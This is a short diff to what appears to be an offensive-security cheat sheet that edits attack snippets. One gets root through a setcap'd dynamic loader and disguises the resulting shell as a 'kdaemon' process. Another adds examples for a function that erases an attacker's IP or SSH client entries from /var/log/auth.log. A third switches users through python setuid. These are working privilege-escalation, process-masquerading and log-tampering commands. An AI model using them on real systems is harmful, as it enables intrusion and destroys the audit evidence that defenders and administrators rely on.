@@ -1612,7 +1612,7 @@ setcap cap_setuid+ep /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
 Become root
 ```bash
 ### Execute as non-root user
-/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
+exec /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /usr/bin/python3 -c 'import os;os.setuid(0);os.execlp("bash", "kdaemon")'
 ```
 
 <a id="implant"></a>
@@ -1762,6 +1762,10 @@ This will reset the logfile to 0 without having to restart syslogd etc:
 This will remove any line containing the IP `1.2.3.4` from the log file:
 ```sh
 xlog() { local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"; }
+```
+
+Examples:
+```sh
 # xlog "1\.2\.3\.4" /var/log/auth.log
 # xlog "${SSH_CLIENT%% *}" /var/log/auth.log
 # xlog "^2023.* thc\.org" foo.log
@@ -1813,7 +1817,7 @@ Needed for taking screenshots of X11 sessions (aka `xwd -root -display :0 | conv
 NAME="UserName"  ### <-- Set UserName
 U=$(id -u ${NAME:?}) \
 && H="$(grep "$U" /etc/passwd | cut -d: -f6)" \
-&& HOME="${H:-/tmp}" python3 -c "import os;os.setuid(${U:?});os.execl('/bin/bash', '-bash')"
+&& HOME="${H:-/tmp}" python3 -c "import os;os.setuid(${U:?});os.execlp('bash', '-bash')"
 # change -bash to bash to not make this a login shell.
 ```
 
